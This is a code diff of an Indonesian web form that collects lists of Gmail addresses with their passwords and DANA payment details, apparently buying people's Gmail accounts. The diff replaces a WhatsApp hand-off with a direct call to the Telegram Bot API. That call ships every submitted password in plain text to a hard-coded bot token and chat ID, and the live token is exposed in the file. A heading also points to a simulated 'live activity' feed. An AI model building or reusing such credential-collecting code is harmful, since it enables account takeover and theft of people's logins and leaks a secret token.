@@ -1543,110 +1543,132 @@
         });
 
         // ===============================================
-        // FUNGSI FORM SUBMIT
         // ===============================================
-        // Nomor WhatsApp admin sudah diganti
-        const adminWhatsAppNumber = "6288229814051";
+// FUNGSI FORM SUBMIT - TELEGRAM BOT
+// ===============================================
+const BOT_TOKEN = "8789657368:AAGLeXo9fh15m1CmAmUY1zApu-TW4kWcEyE";  // Ganti token bot lo
+const CHAT_ID = "5943311408";      // Ganti chat ID lo
 
-        const form = document.getElementById('gmailAccountForm');
-        const sendButton = document.getElementById('sendButton');
-        const messageDiv = document.getElementById('message');
+const form = document.getElementById('gmailAccountForm');
+const sendButton = document.getElementById('sendButton');
+const messageDiv = document.getElementById('message');
 
-        form.addEventListener('submit', function (e) {
-            e.preventDefault();
+form.addEventListener('submit', async function (e) {
+    e.preventDefault();
 
-            sendButton.disabled = true;
-            sendButton.innerHTML = 'Mengarahkan ke WhatsApp... <i class="fas fa-spinner fa-spin"></i>';
-            messageDiv.textContent = ''; // Kosongkan pesan sebelumnya
-            messageDiv.className = 'message'; // Reset kelas pesan
+    sendButton.disabled = true;
+    sendButton.innerHTML = 'Mengirim ke Bot Telegram... <i class="fas fa-spinner fa-spin"></i>';
+    messageDiv.textContent = ''; 
+    messageDiv.className = 'message';
 
-            const emailList = document.getElementById('email_list').value;
-            const jumlahAkun = document.getElementById('jumlah_akun').value;
-            const danaNumber = document.getElementById('dana_number').value;
-            const danaOwnerName = document.getElementById('dana_owner_name').value;
+    const emailList = document.getElementById('email_list').value;
+    const jumlahAkun = document.getElementById('jumlah_akun').value;
+    const danaNumber = document.getElementById('dana_number').value;
+    const danaOwnerName = document.getElementById('dana_owner_name').value;
 
-            // --- Validasi Formulir ---
-            let isValid = true;
-            let errorMessage = '';
+    // VALIDASI FORMULIR (SAMA PERSIS DENGAN LAMA)
+    let isValid = true;
+    let errorMessage = '';
 
-            // Validasi email_list (format email:password dan tidak kosong)
-            if (!emailList.trim()) {
-                isValid = false;
-                errorMessage += 'Daftar Akun Gmail tidak boleh kosong.<br>';
-            } else {
-                const emailLines = emailList.split('\n').filter(line => line.trim()!== '');
-                if (emailLines.length === 0) {
+    if (!emailList.trim()) {
+        isValid = false;
+        errorMessage += 'Daftar Akun Gmail tidak boleh kosong.<br>';
+    } else {
+        const emailLines = emailList.split('\n').filter(line => line.trim()!== '');
+        if (emailLines.length === 0) {
+            isValid = false;
+            errorMessage += 'Daftar Akun Gmail tidak boleh kosong.<br>';
+        } else {
+            const emailPasswordRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com:[a-zA-Z0-9!@#$%^&*()_+\-=\$\${};':"\\|,.<>\/?~]{8,}$/;
+            for (const line of emailLines) {
+                if (!emailPasswordRegex.test(line.trim())) {
                     isValid = false;
-                    errorMessage += 'Daftar Akun Gmail tidak boleh kosong.<br>';
-                } else {
-                    const emailPasswordRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com:[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~]{8,}$/; // Regex lebih ketat untuk Gmail dan password minimal 8 karakter
-                    for (const line of emailLines) {
-                        if (!emailPasswordRegex.test(line.trim())) {
-                            isValid = false;
-                            errorMessage += `Format akun Gmail salah: "${line.trim()}". Harusnya "email@gmail.com:password" (password min. 8 karakter).<br>`;
-                            break;
-                        }
-                    }
+                    errorMessage += `Format akun Gmail salah: "${line.trim()}". Harusnya "email@gmail.com:password".<br>`;
+                    break;
                 }
             }
+        }
+    }
 
-            // Validasi jumlah_akun (harus angka positif)
-            const parsedJumlahAkun = parseInt(jumlahAkun);
-            if (isNaN(parsedJumlahAkun) || parsedJumlahAkun <= 0) {
-                isValid = false;
-                errorMessage += 'Jumlah Akun harus berupa angka positif.<br>';
-            } else if (parsedJumlahAkun!== emailList.split('\n').filter(line => line.trim()!== '').length) {
-                isValid = false;
-                errorMessage += `Jumlah Akun (${parsedJumlahAkun}) yang diinput tidak sesuai dengan jumlah akun yang disetor (${emailList.split('\n').filter(line => line.trim()!== '').length}).<br>`;
-            }
+    const parsedJumlahAkun = parseInt(jumlahAkun);
+    if (isNaN(parsedJumlahAkun) || parsedJumlahAkun <= 0) {
+        isValid = false;
+        errorMessage += 'Jumlah Akun harus berupa angka positif.<br>';
+    } else if (parsedJumlahAkun!== emailList.split('\n').filter(line => line.trim()!== '').length) {
+        isValid = false;
+        errorMessage += `Jumlah Akun (${parsedJumlahAkun}) tidak sesuai dengan jumlah akun yang disetor.<br>`;
+    }
 
-            // Validasi dana_number (hanya angka)
-            const danaRegex = /^[0-9]+$/;
-            if (!danaRegex.test(danaNumber)) {
-                isValid = false;
-                errorMessage += 'Nomor DANA hanya boleh berisi angka.<br>';
-            } else if (danaNumber.length < 10 || danaNumber.length > 13) { // Contoh: validasi panjang nomor DANA (sesuaikan jika perlu)
-                isValid = false;
-                errorMessage += 'Nomor DANA tidak valid (panjang 10-13 digit angka).<br>';
-            }
+    const danaRegex = /^[0-9]+$/;
+    if (!danaRegex.test(danaNumber)) {
+        isValid = false;
+        errorMessage += 'Nomor DANA hanya boleh berisi angka.<br>';
+    } else if (danaNumber.length < 10 || danaNumber.length > 13) {
+        isValid = false;
+        errorMessage += 'Nomor DANA tidak valid (10-13 digit).<br>';
+    }
 
-            // Validasi dana_owner_name (tidak boleh kosong)
-            if (!danaOwnerName.trim()) {
-                isValid = false;
-                errorMessage += 'Nama Pemilik Akun DANA tidak boleh kosong.<br>';
-            }
-            // --- End Validasi Formulir ---
+    if (!danaOwnerName.trim()) {
+        isValid = false;
+        errorMessage += 'Nama Pemilik Akun DANA tidak boleh kosong.<br>';
+    }
 
-            if (!isValid) {
-                messageDiv.innerHTML = errorMessage;
-                messageDiv.className = 'message error';
-                sendButton.disabled = false;
-                sendButton.innerHTML = 'Kirim Data ke WhatsApp Admin <i class="fas fa-paper-plane"></i>';
-                return;
-            }
+    if (!isValid) {
+        messageDiv.innerHTML = errorMessage;
+        messageDiv.className = 'message error';
+        sendButton.disabled = false;
+        sendButton.innerHTML = 'Kirim Data ke Bot Telegram <i class="fas fa-paper-plane"></i>';
+        return;
+    }
 
-            const waMessage = `Halo Admin, saya ingin menyetor akun Gmail:\n\n` +
-                              `*Daftar Akun*:\n${emailList}\n\n` +
-                              `*Jumlah Akun*: ${jumlahAkun}\n` +
-                              `*Nomor DANA Pembayaran*: ${danaNumber}\n` +
-                              `*Nama Pemilik Akun DANA*: ${danaOwnerName}\n\n` +
-                              `Mohon diproses, terima kasih.`;
+    // FORMAT PESAN TELEGRAM CANTIK
+    const telegramMessage = `
+✉️ <b>📩 DATA SETOR GMAIL BARU</b>
 
-            const encodedMessage = encodeURIComponent(waMessage);
-            const whatsappURL = `https://wa.me/${adminWhatsAppNumber}?text=${encodedMessage}`;
+👤 <b>Nama DANA:</b> ${danaOwnerName}
+💰 <b>Jumlah Akun:</b> ${jumlahAkun}
+💳 <b>Nomor DANA:</b> <code>${danaNumber}</code>
 
-            window.open(whatsappURL, '_blank');
+📋 <b>DAFTAR AKUN:</b>
+<pre><code>${emailList}</code></pre>
 
-            messageDiv.textContent = 'Formulir berhasil dikirim! Silakan lanjutkan di WhatsApp.';
-            messageDiv.className = 'message success';
-            form.reset();
+⏰ <i>Dikirim: ${new Date().toLocaleString('id-ID')}</i>
+    `;
 
-            setTimeout(() => {
-                sendButton.disabled = false;
-                sendButton.innerHTML = 'Kirim Data ke WhatsApp Admin <i class="fas fa-paper-plane"></i>';
-            }, 3000);
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: telegramMessage,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
         });
 
+        const result = await response.json();
+
+        if (result.ok) {
+            messageDiv.innerHTML = '✅ Data berhasil dikirim ke Bot Telegram! Admin akan proses segera.';
+            messageDiv.className = 'message success';
+            form.reset();
+        } else {
+            throw new Error(result.description || 'Gagal kirim ke Telegram');
+        }
+    } catch (error) {
+        console.error('Telegram Error:', error);
+        messageDiv.innerHTML = '❌ Gagal mengirim. Coba lagi atau hubungi admin manual.';
+        messageDiv.className = 'message error';
+    }
+
+    setTimeout(() => {
+        sendButton.disabled = false;
+        sendButton.innerHTML = 'Kirim Data ke Bot Telegram <i class="fas fa-paper-plane"></i>';
+    }, 4000);
+});
         // ===============================================
         // FUNGSI LIVE ACTIVITY (SIMULASI)
         // ===============================================
